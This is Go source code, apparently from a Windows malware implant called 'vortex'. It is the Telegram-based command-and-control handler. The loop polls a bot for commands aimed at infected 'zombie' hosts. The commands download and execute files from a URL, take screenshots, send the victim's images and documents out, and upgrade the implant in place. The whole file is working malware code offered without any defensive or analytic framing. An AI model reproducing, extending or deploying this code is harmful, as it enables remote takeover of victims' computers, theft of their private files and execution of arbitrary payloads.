//go:build windows

package telehandler

import (
	"bytes"
	"encoding/json"
	"strconv"
	"strings"
	"time"
	"vortex/encrypt"
	"vortex/opsysinfo"
)

var osInfo = opsysinfo.MachineSpecs()

func latestUpdateCommand(offset int) ([]messageResult, error) {
	var msgResp msgResponse

	msgBody, _ := json.Marshal(map[string]string{
		"chat_id": encrypt.Decrypt(ChatId),
	})

	msgResult, err := msgResp.telegramPostRequest(bytes.NewBuffer(msgBody), "application/json", "getUpdates?offset="+strconv.Itoa(offset+1))
	if err != nil {
		return nil, err
	}

	return msgResult, nil
}

// Telegram commands handler for client controlling
func ClientCommands() {
	var lastUpdateId int

	for {
		commandInit, err := latestUpdateCommand(lastUpdateId)
		if err != nil {
			continue
		}
		if len(commandInit) == 0 {
			time.Sleep(5 * time.Second)
			continue
		}

		lastUpdateId = commandInit[0].UpdateId
		cmdBot := strings.Split(commandInit[0].Message.Text, " ")
		switch cmdBot[0] {
		case "/check":
			if len(cmdBot) == 2 && cmdBot[1] == osInfo.HostID {
				SendMessage("✳️ Zombie user <b>" + osInfo.Username + "</b> is Online!")
			}
		case "/check_all":
			SendMessage("👾 Zombie ID <b>" + osInfo.HostID + "</b>")
		case "/drop":
			if len(cmdBot) == 5 && cmdBot[1] == osInfo.HostID && strings.HasPrefix(cmdBot[2], "http") {
				SendMessage("✈️ File dropping request initiated for <b>" + osInfo.Username + "</b>!")
				if err = dropAndExec(cmdBot[2], cmdBot[3], cmdBot[4]); err != nil {
					SendMessage("🆘 Error while executing the file: " + err.Error())
				} else {
					SendMessage("🛄 File dropped and executed!")
				}
			}
		case "/screenshot":
			if len(cmdBot) == 2 && cmdBot[1] == osInfo.HostID {
				if err := CapDisplayScreen(osInfo.HostID); err != nil {
					SendMessage("🆘 Error while taking screenshot: " + err.Error())
				}
			}
		case "/disable_upload":
			if len(cmdBot) == 2 && cmdBot[1] == osInfo.HostID {
				if err := DataUploadState(false); err != nil {
					SendMessage("⚠️ Error disabling data upload: " + err.Error())
				} else {
					SendMessage("🚭 Data uploading has been disabled for <b>" + osInfo.Username + "</b>")
				}
			}
		case "/enable_upload":
			if len(cmdBot) == 2 && cmdBot[1] == osInfo.HostID {
				if err := DataUploadState(true); err != nil {
					SendMessage("🆘 Error enabling data upload: " + err.Error())
				} else {
					SendMessage("✅ Data uploading has been enabled for <b>" + osInfo.Username + "</b>")
				}
			}
		case "/get_data":
			if len(cmdBot) == 4 && cmdBot[1] == osInfo.HostID {
				if cmdBot[2] != "images" && cmdBot[2] != "documents" {
					SendMessage("🆘 Data type is not available")
				} else {
					SendMessage("⏳ Uploading " + cmdBot[2] + " for <b>" + opsysinfo.MachineSpecs().Username + "</b> initiated")
					if err := exfiltrateData(cmdBot[2], cmdBot[3]); err != nil {
						SendMessage("🆘 Error while uploading: " + err.Error())
					} else {
						SendMessage("✅ Data has been uploaded for " + osInfo.Username)
					}
				}
			}
		case "/upgrade":
			if len(cmdBot) == 4 && cmdBot[1] == osInfo.HostID && strings.HasPrefix(cmdBot[2], "http") {
				SendMessage("〽️ Updating current implant has been initiated, Please wait..")
				if err = upgradeImplants(cmdBot[2], cmdBot[3]); err != nil {
					SendMessage("🆘 Error while updating implant: " + err.Error())
				}
			}
		default:
			if len(cmdBot) == 2 && cmdBot[1] == osInfo.HostID {
				SendMessage("🚷 Target: <b>" + osInfo.Username + "</b> >> The command syntax is wrong or not found!")
			}
		}
	}
}
